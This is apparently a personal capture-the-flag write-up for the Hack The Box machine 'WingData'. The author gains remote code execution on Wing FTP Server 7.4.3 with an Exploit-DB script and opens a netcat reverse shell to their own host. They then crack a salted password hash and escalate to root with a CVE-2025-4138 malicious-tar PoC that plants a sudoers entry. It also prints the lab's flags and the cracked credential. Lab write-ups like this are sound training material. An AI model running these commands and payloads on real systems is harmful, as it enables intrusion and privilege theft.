# Flags
- User
	- b02bc6db68028c4aafbd8ea50213748f
- Root
	- 9b11c69c18d7aec88e077f0364220a2b


# Notes
- First, let's start with a scan
```
rustscan --ulimit 5000 --addresses "10.129.8.223" --top -- -sC -sV
```
- From the results, we can see that a service is being hosted at wingdata.htb
```
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)  
| ssh-hostkey:    
|   256 a1fa958bd7560385e445c9c71eba283b (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL+8LZAmzRfTy+4t8PJxEvRWhPho8aZj9ImxRfWn9TKepkxh8pAF3WDu55pd/gaSUGIo9cuOvv+3r6w7IuCpqI4=  
|   256 9cba211a972f3a6473c14c1dce657a2f (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFFmcxflCAAe4LPgkg7hOxJen41bu6zaE/y08UnA4oRp  
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.66  
|_http-title: Did not follow redirect to http://wingdata.htb/  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.66 (Debian)  
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- So, we can add this into our /etc/hosts
```
10.129.8.223    wingdata.htb
```
- Visiting the website, we are greeted to a website for a data storage solution.
- There is a client portal we can access, in which we are redirected to ftp.wingdata.htb
- So, we need to add this into our /etc/hosts as well
```
10.129.8.223    ftp.wingdata.htb
```
- I am going to do some more enumeration to see if I find anything
```
gobuster dir -w `fzf-wordlists` -u http://wingdata.htb

gobuster vhost -u "http://wingdata.htb" -w `fzf-wordlists` --append-domain
```
- Running both commands doesn't seem to yield anything
- Now, after waiting for a while, the website finally decided to work
- Anyways, it's a login for Wing FTP Server v7.4.3.
- What a specific version. Getting the theme of these boxes lately, I sniff another recent vulnerability
- Sure enough, there is and found a exploitDB entry too!
- And like the previous box, capable of RCE!
	- https://cyberpress.org/vulnerability-in-wing-ftp-server/
	- https://www.exploit-db.com/exploits/52347
- I can take advantage of this tool to start poking around
- Sure enough, we got something to work with
```
[Feb 15, 2026 - 22:53:16 (PST)] exegol-htb-seasons /workspace # python3 52347 -u http://ftp.wingdata.htb -v          
  
[*] Testing target: http://ftp.wingdata.htb  
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami' and username: 'anonymous'  
[+] UID extracted: 9e473336890abcfb397b6e2bf5a08d53f528764d624db129b32c21fbca0cb8d6  
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 9e473336890abcfb397b6e2bf5a08d53f528764d624db129b32c21fbca0cb8d6  
  
--- Command Output ---  
wingftp  
----------------------
```
- With this new power, I will attempt to see if there are any admin credentials or such to dump
- However, it seems that after a while, you get locked out
- So, a better idea would to run a reverse shell one-liner that connects back to the host machine
- I can do this by doing:
```
python3 52347 -u http://ftp.wingdata.htb -c "nc 10.10.14.127 4444 -e /bin/bash"

nc -lvnp 4444
```
- I was then able to get in:
```
[Feb 15, 2026 - 23:05:06 (PST)] exegol-htb-seasons /workspace # nc -lvnp 4444            
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444  
Ncat: Listening on 0.0.0.0:4444  
Ncat: Connection from 10.129.8.230.  
Ncat: Connection from 10.129.8.230:59894.  
whoami  
wingftp
```
- I can go ahead and use the shell upgrade:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'  
wingftp@wingdata:/opt/wftpserver$ whoami  
whoami  
wingftp  
wingftp@wingdata:/opt/wftpserver$
```
- Looking into /etc/passwd, I see the existence of a user named wacky on this machine
```
wingftp@wingdata:/$ cat /etc/passwd  
cat /etc/passwd  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin  
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin  
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin  
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin  
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash  
wacky:x:1001:1001::/home/wacky:/bin/bash  
_laurel:x:999:996::/var/log/laurel:/bin/false
```
- Looking around, I was able to find a hash of wacky's password for the ftp server, which if they reused it, is the user password
	- wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
- Looking into it, it appears to be SHA-256, so we can use something like hashcat to crack it
```
hashcat -m 1400 -a 0 hash.txt `fzf-wordlists`
```
- It appears to not be easy to crack, so I looked further and was able to find a salt
```
<SaltingString>WingFTP</SaltingString>
```
- I was then able to recover a password!
```
[Feb 15, 2026 - 23:58:54 (PST)] exegol-htb-seasons /workspace # hashcat --force -a 0 -m 1410 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP `fzf-wordlists` --show  
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```
- So, now we have a full set of credentials
	- wacky:!#7Blushing^*Bride5
- Let's try to SSH... and it worked!
```
[Feb 15, 2026 - 23:59:50 (PST)] exegol-htb-seasons /workspace # ssh wacky@10.129.8.230          
The authenticity of host '10.129.8.230 (10.129.8.230)' can't be established.  
ED25519 key fingerprint is SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.129.8.230' (ED25519) to the list of known hosts.  
wacky@10.129.8.230's password:    
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Mon Feb 16 03:00:03 2026 from 10.10.14.127  
wacky@wingdata:~$
```
- From here, I am able to read out the user flag!
```
wacky@wingdata:~$ cd /home/wacky  
wacky@wingdata:~$ ls  
user.txt  
wacky@wingdata:~$ cat user.txt  
b02bc6db68028c4aafbd8ea50213748f  
wacky@wingdata:~$
```
- Looking for sudo -l, looks like I have some files to work with
```
wacky@wingdata:~$ sudo -l  
Matching Defaults entries for wacky on wingdata:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User wacky may run the following commands on wingdata:  
   (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```
- We are able to run the script below
```
#!/usr/bin/env python3                                                    
import tarfile                                                         
import os                                                          
import sys                                                          
import re                                                            
import argparse                                                                                                                                                                  
BACKUP_BASE_DIR = "/opt/backup_clients/backups"                   
STAGING_BASE = "/opt/backup_clients/restored_backups"                                                                                                                                       
def validate_backup_name(filename):                                       
   if not re.fullmatch(r"^backup_\d+\.tar$", filename):                
       return False                                                 
   client_id = filename.split('_')[1].rstrip('.tar')                   
   return client_id.isdigit() and client_id != "0"
   
def validate_restore_tag(tag):  
   return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))  
  
def main():  
   parser = argparse.ArgumentParser(  
       description="Restore client configuration from a validated backup tarball.",  
       epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"  
   )  
   parser.add_argument(  
       "-b", "--backup",  
       required=True,  
       help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "  
            "where <client_id> is a positive integer, e.g., backup_1001.tar)"  
   )  
   parser.add_argument(  
       "-r", "--restore-dir",  
       required=True,  
       help="Staging directory name for the restore operation. "  
            "Must follow the format: restore_<client_user> (e.g., restore_john). "  
            "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."  
   )  
  
   args = parser.parse_args()  
  
   if not validate_backup_name(args.backup):  
       print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)  
       sys.exit(1)  
  
   backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)  
   if not os.path.isfile(backup_path):  
       print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)  
       sys.exit(1)  
  
   if not args.restore_dir.startswith("restore_"):  
       print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)  
       sys.exit(1)  
  
   tag = args.restore_dir[8:]  
   if not tag:  
       print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)  
       sys.exit(1)  
  
   if not validate_restore_tag(tag):  
       print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)  
       sys.exit(1)  
  
   staging_dir = os.path.join(STAGING_BASE, args.restore_dir)  
   print(f"[+] Backup: {args.backup}")  
   print(f"[+] Staging directory: {staging_dir}")  
  
   os.makedirs(staging_dir, exist_ok=True)  
  
   try:  
       with tarfile.open(backup_path, "r") as tar:  
           tar.extractall(path=staging_dir, filter="data")  
       print(f"[+] Extraction completed in {staging_dir}")  
   except (tarfile.TarError, OSError, Exception) as e:  
       print(f"[!] Error during extraction: {e}", file=sys.stderr)  
       sys.exit(2)  
  
if __name__ == "__main__":  
   main()
```
- So, we can create a malicious TAR file to do that
- Looks like a well known vulnerability as well, with some pocs available:
	- https://github.com/kyakei/CVE-2025-4138-poc
- So, we can use this tool to generate ourselves a malicious TAR file that will grant us (wacky) root privileges
- We'll create it on our side to make it easier
```
[Feb 20, 2026 - 20:56:06 (PST)] exegol-htb-seasons CVE-2025-4138-poc # python3 exploit.py -u wacky -o backup_1001.tar               
  
_____________   _______________         _______________   ________   .________            _____ ____________    ______      
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \  |   ____/           /  |  /_   \_____  \  /  __  \     
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/  |____  \   ______  /   |  ||   | _(__  <  >      <     
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \  /       \ /_____/ /    ^   /   |/       \/   --   \    
\______  / \___/   /_______  /         \_______ \_____  /\_______ \/______  /         \____   ||___/______  /\______  /    
       \/                  \/                  \/     \/         \/       \/               |__|           \/        \/     
  
  CVE-2025-4138 Auto-Sudo by kyakei  
  
[*] Target User:  wacky  
[*] Target File:  /etc/sudoers.d/wacky  
[*] Payload:      wacky ALL=(ALL) NOPASSWD: ALL  
  
[+] Exploit generated successfully: backup_1001.tar  
[+] Size: 112640 bytes  
  
[*] Next Steps:  
   1. Transfer this tar file to the target machine (if remote).  
   2. Wait for a privileged process (using vulnerable Python) to extract it.  
   3. OR, if you have a vulnerable SUID python script, run it against this tar.  
   4. Once extracted, run: 'sudo su' to get a root shell.
```
- We can then transfer that over onto our machine
```
[Feb 20, 2026 - 21:18:16 (PST)] exegol-htb-seasons CVE-2025-4138-poc # scp backup_1001.tar wacky@10.129.1.186:/tmp/     
wacky@10.129.1.186's password:    
backup_1001.tar
```
- Quick confirmation is done
```
wacky@wingdata:/tmp$ ls  
backup_1001.tar                                                          systemd-private-de829ae3856149e99c023c6ce3d19d81-systemd-logind.service-bBxlBo     vmware-root  
systemd-private-de829ae3856149e99c023c6ce3d19d81-apache2.service-1IRorP  systemd-private-de829ae3856149e99c023c6ce3d19d81-systemd-timesyncd.service-iSpYT4  vmware-root_3375-4290557840  
wacky@wingdata:/tmp$
```
- Awesome, now we can pass in that file with our script!
- Moving in our tar file into the proper directory,
```
wacky@wingdata:/tmp$ mv backup_1001.tar /opt/backup_clients/backups/  
wacky@wingdata:/tmp$ ls /opt/backup_clients/backups/  
backup_1001.tar
```
- Let's fire away!
```
wacky@wingdata:/tmp$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_wacky  
[+] Backup: backup_1001.tar  
[+] Staging directory: /opt/backup_clients/restored_backups/restore_wacky  
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_wacky  
wacky@wingdata:/tmp$ sudo su  
root@wingdata:/tmp# whoami  
root
```
- It worked, yay!
- We can now get the root flag!
```
root@wingdata:~# cat root.txt    
9b11c69c18d7aec88e077f0364220a2b
```
